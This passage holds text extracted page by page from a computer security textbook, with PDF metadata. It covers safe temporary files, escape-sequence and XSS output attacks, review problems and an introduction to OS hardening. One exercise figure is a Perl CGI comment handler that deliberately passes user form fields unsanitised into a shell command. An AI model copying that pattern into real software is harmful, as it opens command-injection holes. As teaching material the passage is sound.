systems. Hence care is needed to ensure that the chosen mechanism \\nis used correctly.\\nFigure 11.8 illustrates the use of the advisory flock call in a Perl script. This \\nmight typically be used in a Web CGI form handler to append information provided \\nby a user to this file. Subsequently another program, also using this locking mecha -\\nnism, could access the file and process and remove these details. Note that there \\nare subtle complexities related to locking files using different types of read or write \\naccess. Suitable program or function references should be consulted on the correct \\nuse of these features.\\nSafe Temporary File Use\\nMany programs need to store a temporary copy of data while they are processing the \\ndata. A temporary file is commonly used for this purpose. Most operating systems \\nprovide well-known locations for placing temporary files and standard functions for \\nnaming and creating them. The critical issue with temporary files is that they are \\nunique and not accessed by other processes. In a sense, this is the opposite problem \\nFigure 11.8 Perl File Locking Example\\n#!/usr/bin/perl\\n#\\n$EXCL_LOCK = 2;\\n$UNLOCK   = 8;\\n$FILENAME  = \"forminfo.dat\";\\n# open data file and acquire exclusive access lock\\nopen (FILE, \">> $FILENAME\") | | die \"Failed to open $FILENAME \\\\n\";\\nflock FILE, $EXCL_LOCK;\\n… use exclusive access to the forminfo file to save details\\n# unlock and close file\\nflock FILE, $UNLOCK;\\nclose(FILE);\\nM11_STAL0611_04_GE_C11.indd   410 10/11/17   3:02 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 412, 'page_label': '411'}, page_content='to managing access to a shared file. The most common technique for constructing a \\ntemporary filename is to include a value such as the process identifier. As each pro-\\ncess has its own distinct identifier, this should guarantee a unique name. The program \\ngenerally checks to ensure that the file does not already exist, perhaps left over from \\na crash of a previous program, then creates the file. This approach suffices from the \\nperspective of reliability but not with respect to security.\\nAgain the problem is that an attacker does not play by the rules. The attacker \\ncould attempt to guess the temporary filename a privileged program will use. The \\nattacker then attempts to create a file with that name in the interval between the \\nprogram checking the file does not exist and subsequently creating it. This is another \\nexample of a race condition, very similar to that when two processes race to access \\na shared file when locks are not used. There is a famous example, reported in \\n[WHEE03], of some versions of the tripwire file integrity program 9 suffering from \\nthis bug. The attacker would write a script that made repeated guesses on the tem -\\nporary filename used and create a symbolic link from that name to the password file. \\nAccess to the password file was restricted, so the attacker could not write to it. \\nHowever, the tripwire program runs with root privileges, giving it access to all files \\non the system. If the attacker succeeds, then tripwire will follow the link and use the \\npassword file as its temporary file, destroying all user login details and denying \\naccess to the system until the administrators can replace the password file with a \\nbackup copy. This was a very effective and inconvenient denial-of-service attack on \\nthe targeted system. This illustrates the importance of securely managing temporary \\nfile creation.\\nSecure temporary file creation and use preferably requires the use of a random \\ntemporary filename. The creation of this file should be done using an atomic system \\nprimitive, as is done with the creation of a lockfile. This prevents the race condition \\nand hence the potential exploit of this file. The standard C function mkstemp() is \\nsuitable; however, the older functions tmpfile(), tmpnam(), and tempnam() are all \\ninsecure unless used with care. It is also important that the minimum access is given \\nto this file. In most cases only the effective owner of the program creating this file \\nshould have any access. The GNOME Programming Guidelines recommend using \\nthe C code shown in Figure 11.9 to create a temporary file in a shared directory on \\nLinux and UNIX systems. Although this code calls the insecure tempnam() function, \\nit uses a loop with appropriately restrictive file creation flags to counter its security \\ndeficiencies. Once the program has finished using the file, it must be closed and \\nunlinked. Perl programmers can use the File::Temp module for secure temporary file \\ncreation. Programmers using other languages should consult appropriate references \\nfor suitable methods.\\nWhen the file is created in a shared temporary directory, the access permissions \\nshould specify that only the owner of the temporary file, or the system administrators, \\nshould be able to remove it. This is not always the default permission setting, which \\n9Tripwire is used to scan all directories and files on a system, detecting any important files that have unau-\\nthorized changes. Tripwire can be used to detect attempts to subvert the system by an attacker. It can also \\ndetect incorrect program behavior that is causing unexpected changes to files.\\n11.4 / iNTERACTiNG wiTH THE oPERATiNG SySTEM  411\\nM11_STAL0611_04_GE_C11.indd   411 10/11/17   3:02 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 413, 'page_label': '412'}, page_content='412  CHAPTER 11 / SofTwARE SECuRiTy\\nchar *filename;\\nint fd;\\ndo {\\n  filename = tempnam (NULL, \"foo\");\\n  fd = open (filename, O CREAT | O EXCL | O TRUNC | O RDWR, 0600);\\n  free (filename);\\n} while (fd == –1);\\nFigure 11.9 C Temporary File Creation Example\\nmust be corrected to enable secure use of such files. On Linux and UNIX systems this \\nrequires setting the sticky permission bit on the temporary directory, as we discussed \\nin Sections 4.4 and 25.3.\\nInteracting with Other Programs\\nAs well as using functionality provided by the operating system and standard library \\nfunctions, programs may also use functionality and services provided by other programs. \\nUnless care is taken with this interaction, failure to identify assumptions about the \\nsize and interpretation of data flowing among different programs can result in security \\nvulnerabilities. We discussed a number of issues related to managing program input in \\nSection 11.2 and program output in Section 11.5. The flow of information between pro-\\ngrams can be viewed as output from one forming input to the other. Such issues are of \\nparticular concern when the program being used was not originally written with this \\nwider use as a design issue and hence did not adequately identify all the security con-\\ncerns that might arise. This occurs particularly with the current trend of providing Web \\ninterfaces to programs that users previously ran directly on the server system. While \\nideally all programs should be designed to manage security concerns and be written \\ndefensively, this is not the case in reality. Hence the burden falls on the newer pro -\\ngrams, utilizing these older programs, to identify and manage any security issues that  \\nmay arise.\\nA further concern relates to protecting the confidentiality and integrity of the \\ndata flowing among various programs. When these programs are running on the same \\ncomputer system, appropriate use of system functionality such as pipes or tempo -\\nrary files provides this protection. If the programs run on different systems, linked \\nby a suitable network connection, then appropriate security mechanisms should be \\nemployed by these network connections. Alternatives include the use of IP Security \\n(IPSec), Transport Layer/Secure Socket Layer Security (TLS/SSL), or Secure Shell \\n(SSH) connections. Even when using well regarded, standardized protocols, care is \\nneeded to ensure they use strong cryptography, as weaknesses have been found in a \\nnumber of algorithms and their implementations [SIMP11]. We will discuss some of \\nthese alternatives in Chapter 22.\\nSuitable detection and handling of exceptions and errors generated by program \\ninteraction is also important from a security perspective. When one process invokes \\nanother program as a child process, it should ensure that the program terminates cor-\\nrectly and accept its exit status. It must also catch and process signals resulting from \\ninteraction with other programs and the operating system.\\nM11_STAL0611_04_GE_C11.indd   412 10/11/17   3:02 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 414, 'page_label': '413'}, page_content='11.5 / HANDLiNG PRoGRAM ouTPuT  413\\n 11.5 HANDLING PROGRAM OUTPUT\\nThe final component of our model of computer programs is the generation of  output \\nas a result of the pr ocessing of input and other interactions. This output might be \\nstored for future use (e.g., in files or a database), or be transmitted over a network \\nconnection, or be destined for display to some user. As with program input, the out-\\nput data may be classified as binary or textual. Binary data may encode complex \\nstructures, such as requests to an X-Windows display system to create and manipu -\\nlate complex graphical interface display components. Or the data could be complex \\nbinary network protocol structures. If representing textual information, the data will \\nbe encoded using some character set and possibly representing some structured out-\\nput, such as HTML.\\nIn all cases, it is important from a program security perspective that the  output \\nreally does conf orm to the expected form and interpretation. If directed to a user, \\nit will be interpreted and displayed by some appropriate program or device. If this \\noutput includes unexpected content, then anomalous behavior may result, with det-\\nrimental effects on the user. A critical issue here is the assumption of common origin. \\nIf a user is interacting with a program, the assumption is that all output seen was cre-\\nated by, or at least validated by, that program. However, as the discussion of cross-site \\nscripting (XSS) attacks in Section 11.2 illustrates, this assumption may not be valid. \\nA program may accept input from one user, save it, and subsequently display it to \\nanother user. If this input contains content that alters the behavior of the program \\nor device displaying the data, and the content is not adequately sanitized by the pro-\\ngram, then an attack on the user is possible.\\nConsider two examples. The first involves simple text-based programs run on \\nclassic time-sharing systems when purely textual terminals, such as the VT100, were \\nused to interact with the system.10 Such terminals often supported a set of function \\nkeys, which could be programmed to send any desired sequence of characters when \\npressed. This programming was implemented by sending a special escape sequence.11 \\nThe terminal would recognize these sequences and, rather than displaying the char-\\nacters on the screen, would perform the requested action. In addition to programming \\nthe function keys, other escape sequences were used to control formatting of the \\ntextual output (bold, underline, etc.), to change the current cursor location, and criti-\\ncally to specify that the current contents of a function key should be sent, as if the user \\nhad just pressed the key. Together, these capabilities could be used to implement a \\nclassic command injection attack on a user, which was a favorite student prank in \\nprevious years. The attacker would get the victim to display some carefully crafted text \\non his or her terminal. This could be achieved by convincing the victim to run a \\n program, have it included in an e-mail message, or have it written directly to the vic-\\ntim’s terminal if the victim permitted this. While displaying some innocent message to \\ndistract the targeted user, this text would also include a number of escape sequences \\n11So designated because such sequences almost always started with the escape (ESC) character from the \\nASCII character set.\\n10Common terminal programs typically emulate such a device when interacting with a command-line shell \\non a local or remote system.\\nM11_STAL0611_04_GE_C11.indd   413 10/11/17   3:02 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 415, 'page_label': '414'}, page_content='414  CHAPTER 11 / SofTwARE SECuRiTy\\nthat first programmed a function key to send some selected command and then the \\ncommand to send that text as if the programmed function key had been pressed. If \\nthe text was displayed by a program that subsequently exited, then the text sent from \\nthe programmed function key would be treated as if the targeted user had typed it as \\nhis or her next command. Hence the attacker could make the system perform any \\ndesired operation the user was permitted to do. This could include deleting the user’s \\nfiles or changing the user’s password. With this simple form of attack, the user would \\nsee the commands and the response being displayed and know it had occurred, though \\ntoo late to prevent it. With more subtle combinations of escape sequences, it was pos-\\nsible to capture and prevent this text from being displayed, hiding the fact of the attack \\nfrom direct observation by the user until its consequences became obvious. A more \\nmodern variant of this attack exploits the capabilities of an insufficiently protected \\nX-terminal display to similarly hijack and control one or more of the user’s sessions.\\nThe key lesson illustrated by this example concerns the user’s expectations of \\nthe type of output that would be sent to the user’s terminal display. The user expected \\nthe output to be primarily pure text for display. If a program such as a text editor or \\nmail client used formatted text or the programmable function keys, then it was trusted \\nnot to abuse these capabilities. And indeed, most such programs encountered by users \\ndid indeed respect these conventions. Programs like a mail client, which displayed \\ndata originating from other users, needed to filter such text to ensure that any escape \\nsequences included in them were disabled. The issue for users then was to identify \\nother programs that could not be so trusted, and if necessary filter their output to \\nfoil any such attack. Another lesson seen here, and even more so in the subsequent \\nX- terminal variant of this attack, was to ensure that untrusted sources were not per-\\nmitted to direct output to a user’s display. In the case of traditional terminals, this \\nmeant disabling the ability of other users to write messages directly to the user’s dis-\\nplay. In the case of X-terminals, it meant configuring the authentication mechanisms so \\nonly programs run at the user’s command were permitted to access the user’s display.\\nThe second example is the classic cross-site scripting (XSS) attack using a guest-\\nbook on some Web server. If the guestbook application fails adequately to check \\nand sanitize any input supplied by one user, then this can be used to implement \\nan attack on users subsequently viewing these comments. This attack exploits the \\nassumptions and security models used by Web browsers when viewing content from \\na site. Browsers assume all of the content was generated by that site and is equally \\ntrusted. This allows programmable content like JavaScript to access and manipulate \\ndata and metadata at the browser site, such as cookies associated with that site. The \\nissue here is that not all data were generated by, or under the control of, that site. \\nRather, the data came from some other, untrusted user.\\nAny programs that gather and rely on third-party data have to be responsible \\nfor ensuring that any subsequent use of such data is safe and does not violate the \\nuser’s assumptions. These programs must identify what is permissible output content \\nand filter any possibly untrusted data to ensure that only valid output is displayed. \\nThe simplest filtering alternative is to remove all HTML markup. This will certainly \\nmake the output safe but can conflict with the desire to allow some formatting of the \\noutput. The alternative is to allow just some safe markup through. As with input fil-\\ntering, the focus should be on allowing only what is safe rather than trying to remove \\nwhat is dangerous, as the interpretation of dangerous may well change over time.\\nM11_STAL0611_04_GE_C11.indd   414 10/11/17   3:02 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 416, 'page_label': '415'}, page_content='11.6 / KEy TERMS, REViEw QuESTioNS, AND PRoBLEMS  415\\nAnother issue here is that different character sets allow different encodings of \\nmeta characters, which may change the interpretation of what is valid output. If the \\ndisplay program or device is unaware of the specific encoding used, it might make \\na different assumption to the program, possibly subverting the filtering. Hence it is \\nimportant for the program either to explicitly specify encoding where possible or \\notherwise ensure that the encoding conforms to the display expectations. This is the \\nobverse of the issue of input canonicalization, where the program ensures that it \\nhad a common minimal representation of the input to validate. In the case of Web \\n output, it is possible for a Web server to specify explicitly the character set used in \\nthe Content-Type HTTP response header. Unfortunately, this is not specified as often \\nas it should be. If not specified, browsers will make an assumption about the default \\ncharacter set to use. This assumption is not clearly codified; hence different browsers \\ncan and do make different choices. If Web output is being filtered, the character set \\nshould be specified.\\nNote that in these examples of security flaws that result from program output, \\nthe target of compromise was not the program generating the output but rather\\xa0the \\nprogram or device used to display the output. It could be argued that this is not \\nthe concern of the programmer, as their program is not subverted. However, if the \\nprogram acts as a conduit for attack, the programmer’s reputation will be tarnished, \\nand users may well be less willing to use the program. In the case of XSS attacks, a \\nnumber of well-known sites were implicated in these attacks and suffered adverse \\npublicity.\\n 11.6 KEY TERMS, REVIEW QUESTIONS, AND PROBLEMS\\nKey Terms\\natomic operation\\ncanonicalization\\ncode injection\\ncommand injection\\ncross-site scripting (XSS) \\nattack\\ndefensive programming\\nenvironment variable\\nfuzzing\\ninjection attack\\nleast privilege\\nmemory leak\\nprivilege escalation\\nrace condition\\nregular expression\\nsecure programming\\nsoftware quality\\nsoftware reliability\\nsoftware security\\nSQL injection\\nXSS reflection\\nReview Questions\\n 11.1 Define the difference between software quality and reliability and software security.\\n 11.2 Define defensive programming.\\n 11.3 When does a buffer overflow occur?\\n 11.4 Define an injection attack. List some examples of injection attacks. What are the \\n general circumstances in which injection attacks are found?\\n 11.5 State the similarities and differences between command injection and SQL injection \\nattacks.\\n 11.6 Define a code injection attack. List an example of such an attack.\\nM11_STAL0611_04_GE_C11.indd   415 10/11/17   3:02 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 417, 'page_label': '416'}, page_content='416  CHAPTER 11 / SofTwARE SECuRiTy\\n 11.7 State the main technique used by a defensive progr ammer to validate assumptions \\nabout program input.\\n 11.8 Explain canonicaliztion and its purpose.\\n 11.9 Define cross-site scripting (XSS) reflection vulnerability.\\n 11.10 What is the significance of canonicalization?\\n 11.11 Define race condition. State how it can occur when multiple processes access shared \\nmemory.\\n 11.12 What are environment variables? Explain with a few examples.\\n 11.13 Describe the advantages and the disadvantages of fuzzing.\\n 11.14 What is memory leak and what are its implications?\\n 11.15 Identify several issues associated with the correct creation and use of a temporary file \\nin a shared directory.\\n 11.16 List some problems that may result from a program sending unvalidated input from \\none user to another user.\\nProblems\\n 11.1 Describe the possible ways of defending the attack shown in Figure 11.4.\\n 11.2 Identify a list of the most popular SQL metacharacters or reserved words which are \\nused by the majority of the relational databases in the present scenario and inves -\\ntigate their meaning. What does this imply about input validation checks used to \\nprevent SQL injection attacks across different types of relational databases in use \\ntoday?\\n 11.3 Rewrite the perl finger CGI script shown in F igure 11.2 to include both appropriate \\ninput validation and more informative error messages, as suggested by footnote 3 in \\nSection 11.2. Extend the input validation to also permit any of the characters −+% \\nin the middle of $user value, but not at either the start or end of this value. Con -\\nsider the implications of further permitting space or tab characters within this value. \\nBecause such values separate arguments to a shell command, the $user value must \\nbe surrounded by the correct quote characters when passed to the finger command. \\nDetermine how this is done. If possible, copy your modified script, and the form \\nused to call it, to a suitable Linux/UNIX-hosted Web server, and verify its correct \\noperation.\\n 11.4 You ar e asked to improve the security in the CGI handler script used to send \\ncomments to the Web master of your server. The current script in use is shown in  \\nFigure 11.10a, with the associated form shown in Figure 11.10b. Identify some security \\ndeficiencies present in this script. Detail what steps are needed to correct them, and \\ndesign an improved version of this script.\\n 11.5 Investigate the issues that arise while using sequence number as both identifier and \\nauthenticator of packets. Identify the root cause of the problem.\\n 11.6 Investigate the v arious types of cross-site scripting (XSS) attacks. How can such \\nattacks be prevented? \\n 11.7 One approach to improving program safety is to use a fuzzing tool. These test  programs \\nusing a large set of automatically generated inputs, as we discussed in Section 11.2. \\nIdentity some suitable fuzzing tools for a system that you know. Determine the cost, \\navailability, and ease of use of these tools. Indicate the types of development projects \\nthey would be suitable to use in.\\nM11_STAL0611_04_GE_C11.indd   416 10/11/17   3:02 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 418, 'page_label': '417'}, page_content='11.6 / KEy TERMS, REViEw QuESTioNS, AND PRoBLEMS  417\\n 11.8 Another approach to improving program safety is to use a static analysis tool, which \\nscans the program source looking for known program deficiencies. Identity some suit-\\nable static analysis tools for a language that you know. Determine the cost, availability, \\nand ease of use of these tools. Indicate the types of development projects they would \\nbe suitable to use in.\\n#!/usr/bin/perl\\n# comment.cgi - send comment to webmaster\\n# specify recipient of comment email\\n$to = \"webmaster\";\\nuse CGI;\\nuse CGI::Carp qw(fatalsToBrowser);\\n$q = new CGI; #    create query object\\n# display HTML header\\nprint $q->header,\\n$q->start_html(\\'Comment Sent\\'),\\n$q->h1(\\'Comment Sent\\');\\n# retrieve form field values and send comment to webmaster\\n$subject = $q->param(\"subject\");\\n$from = $q->param(\"from\");\\n$body = $q->param(\"body\");\\n# generate and send comment email\\nsystem(\"export REPLYTO=\\\\\"$from\\\\\"; echo \\\\\"$body\\\\\" | mail -s \\\\\"$subject\\\\\"\\n$to\");\\n# indicate to user that email was sent\\nprint ”Thank you for your comment on $subject.\";\\nprint \"This has been sent to $to.\";\\n# display HTML footer\\nprint $q->end_html;\\nFigure 11.10 Comment Form Handler Exercise\\n(a) Comment CGI script\\n(b) Web comment form\\n<html><head><title>Send a Comment</title></head><body>\\n<h1> Send a Comment </h1>\\n<form method=post action=\"comment.cgi\">\\n<b>Subject of this comment</b>: <input type=text name=subject value=\"\">\\n<b>Your Email Address</b>: <input type=text name=from value=\"\">\\n<p>Please enter comments here:\\n<p><textarea name=\"body\" rows=15 cols=50></textarea>\\n<p><input type=submit value=\"Send Comment\">\\n<input type=\"reset\" value=\"Clear Form\">\\n</form></body></html>\\nM11_STAL0611_04_GE_C11.indd   417 10/11/17   3:02 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 419, 'page_label': '418'}, page_content='418  CHAPTER 11 / SofTwARE SECuRiTy\\n 11.9 Examine the current values of all environment variables on a system you use. If pos -\\nsible, determine the use for some of these values. Determine how to change the values \\nboth temporarily for a single process and its children, and permanently for all subse -\\nquent logins on the system.\\n 11.10 Experiment on a Linux/UNIX system with a version of the vulnerable shell script \\nshown in F igures 11.6a and 11.6b, but using a small data file of your own. Explore \\nchanging first the PATH environment variable, then the IFS variable as well, and mak-\\ning this script execute another program of your choice.\\nM11_STAL0611_04_GE_C11.indd   418 10/11/17   3:02 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 420, 'page_label': '419'}, page_content='419\\n12.1 Introduction to Operating System Security\\n12.2 System Security Planning\\n12.3 Operating Systems Hardening\\nOperating System Installation: Initial Setup and Patching\\nRemove Unnecessary Services, Application, and Protocols\\nConfigure Users, Groups, and Authentication\\nConfigure Resource Controls\\nInstall Additional Security Controls\\nTest the System Security\\n12.4 Application Security\\nApplication Configuration\\nEncryption Technology\\n12.5 Security Maintenance\\nLogging\\nData Backup and Archive\\n12.6 Linux/Unix Security\\nPatch Management\\nApplication and Service Configuration\\nUsers, Groups, and Permissions\\nRemote Access Controls\\nLogging and Log Rotation\\nApplication Security Using a chroot jail\\nSecurity Testing\\n12.7 Windows Security\\nPatch Management\\nUsers Administration and Access Controls\\nApplication and Service Configuration\\nOther Security Controls\\nSecurity Testing\\n12.8 Virtualization Security\\nVirtualization Alternatives\\nVirtualization Security Issues\\nSecuring Virtualization Systems\\n12.9 Key Terms, Review Questions, and Problems\\nOperating System Security\\nCHAPTER \\n \\nM12_STAL0611_04_GE_C12.indd   419 10/11/17   3:02 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 421, 'page_label': '420'}, page_content='420  CHAPTER 12 / OPERATing SySTEm SECuRiTy\\nComputer client and server systems are central components of the IT infrastructure \\nfor most organizations. The client systems provide access to organizational data and \\napplications, supported by the servers housing those data and applications. How -\\never, given that most large software systems will almost certainly have a number of \\nsecurity weaknesses, as we discussed in Chapter 6 and in the previous two chapters, \\nit is currently necessary to manage the installation and continuing operation of these \\nsystems to provide appropriate levels of security despite the expected presence of \\nthese vulnerabilities. In some circumstances, we may be able to use trusted computing \\nsystems designed and evaluated to provide security by design. We will examine some \\nof these possibilities in Chapter 27 .\\nIn this chapter, we discuss how to provide systems security as a hardening pro-\\ncess that includes planning, installation, configuration, update, and maintenance of \\nthe operating system and the key applications in use, following the general approach \\ndetailed in NIST SP 800-123 (Guide to General Server Security, July 2008). We con-\\nsider this process for the operating system, and then key applications in general, then \\ndiscuss some specific aspects in relation to Linux and Windows systems in particular. \\nWe conclude with a discussion on securing virtualized systems, where multiple virtual \\nmachines may execute on the one physical system.\\nWe view a system as having a number of layers, with the physical hardware at \\nthe bottom; the base operating system above including privileged kernel code, APIs, \\nand services; and finally user applications and utilities in the top layer, as shown in \\nFigure 12.1. This figure also shows the presence of BIOS and possibly other code that \\nLearning Objectives\\nAfter studying this chapter, you should be able to:\\n ◆ List the steps needed in the process of securing a system.\\n ◆ Detail the need for planning system security.\\n ◆ List the basic steps used to secure the base operating system.\\n ◆ List the additional steps needed to secure key applications.\\n ◆ List steps needed to maintain security.\\n ◆ List some specific aspects of securing Unix/Linux systems.\\n ◆ List some specific aspects of securing Windows systems.\\n ◆ List steps needed to maintain security in virtualized systems.\\nFigure 12.1 Operating System Security Layers\\nPhysical Hardware\\nOperating System Kernel\\nUser Applications and Utilities\\nBIOS / SMM\\nM12_STAL0611_04_GE_C12.indd   420 10/11/17   3:02 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 422, 'page_label': '421'}, page_content='12.1 / inTRODuCTiOn TO OPERATing SySTEm SECuRiTy  421\\nis external to, and largely not visible from, the operating system kernel, but is used \\nwhen booting the system or to support low-level hardware control. Each of these \\nlayers of code needs appropriate hardening measures in place to provide appropriate \\nsecurity services. And each layer is vulnerable to attack from below, should the lower \\nlayers not also be secured appropriately.\\nA number of reports note the use of a small number of basic hardening mea -\\nsures can prevent a large proportion of the attacks seen in recent years. Since 2010, \\nthe Australian Signals Directorate (ASD) list of the “Top 35 Mitigation  Strategies” \\nnotes that implementing just the top four of these strategies would have prevented \\nat least 85% of the targeted cyber intrusions investigated by ASD. Hence, since 2013 \\nthese top four strategies are mandatory for all Australian government agencies. These \\ntop four strategies are as follows:\\n1. White-list approved applications.\\n2. Patch third-party applications.\\n3. Patch operating system vulnerabilities and use the latest versions.\\n4. Restrict administrative privileges.\\nCollectively these assist in creating a defence-in-depth system. We discuss all four of \\nthese strategies, and many others in the ASD list, in this chapter. Note these strategies \\nlargely align with those in the “20 Critical Controls” developed by DHS, NSA, the \\nDepartment of Energy, SANS, and others in the United States.\\n 12.1 INTRODUCTION TO OPERATING SYSTEM SECURITY\\nAs we noted above, computer client and server systems are central components of \\nthe IT infrastructure for most organizations, may hold critical data and applications, \\nand are a necessary tool for the function of an organization. Accordingly, we need to \\nbe aware of the expected presence of vulnerabilities in operating systems and appli-\\ncations as distributed, and the existence of worms scanning for such vulnerabilities \\nat high rates, such as those we discussed in Section 6.3. Thus, it is quite possible for \\na system to be compromised during the installation process, before it can install the \\nlatest patches or implement other hardening measures. Hence, building and deploy-\\ning a system should be a planned process designed to counter such a threat, and to \\nmaintain security during its operational lifetime.\\nNIST SP 800-123 states that this process must:\\n• Assess risks and plan the system deployment.\\n• Secure the underlying operating system and then the key applications.\\n• Ensure any critical content is secured.\\n• Ensure appropriate network protection mechanisms are used.\\n• Ensure appropriate processes are used to maintain security.\\nWhile we addressed the selection of network protection mechanisms in Chapter 9, \\nwe will examine the other items in the rest of this chapter.\\nM12_STAL0611_04_GE_C12.indd   421 10/11/17   3:02 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 423, 'page_label': '422'}, page_content='422  CHAPTER 12 / OPERATing SySTEm SECuRiTy\\n 12.2 SYSTEM SECURITY PLANNING\\nThe first step in deploying new systems is planning. Careful planning will help to \\nensure that the new system is as secure as possible, and complies with any necessary \\npolicies. This planning should be informed by a wider security assessment of the orga-\\nnization, since every organization has distinct security requirements and concerns. \\nWe will discuss this wider planning process in Chapters 14 and 15.\\nThe aim of the specific system installation planning process is to maximize \\nsecurity while minimizing costs. Wide experience shows that it is much more difficult \\nand expensive to “retro-fit” security at a later time, than it is to plan and provide it \\nduring the initial deployment process. This planning process needs to determine the \\nsecurity requirements for the system, its applications and data, and of its users. This \\nthen guides the selection of appropriate software for the operating system and appli-\\ncations, and provides guidance on appropriate user configuration and access control \\nsettings. It also guides the selection of other hardening measures required. The plan \\nalso needs to identify appropriate personnel to install and manage the system, noting \\nthe skills required and any training needed.\\nNIST SP 800-123 provides a list of items that should be considered during the \\nsystem security planning process. While its focus is on secure server deployment, much \\nof the list applies equally well to client system design. This list includes consideration of:\\n• The purpose of the system, the type of information stored, the applications and \\nservices provided, and their security requirements.\\n• The categories of users of the system, the privileges they have, and the types of \\ninformation they can access.\\n• How the users are authenticated.\\n• How access to the information stored on the system is managed.\\n• What access the system has to information stored on other hosts, such as file or \\ndatabase servers, and how this is managed.\\n• Who will administer the system, and how they will manage the system (via local \\nor remote access).\\n• Any additional security measures required on the system, including the use of \\nhost firewalls, anti-virus or other malware protection mechanisms, and logging.\\n 12.3 OPERATING SYSTEMS HARDENING\\nThe first critical step in securing a system is to secure the base operating system \\nupon which all other applications and services rely. A good security foundation needs \\na properly installed, patched, and configured operating system. Unfortunately, the 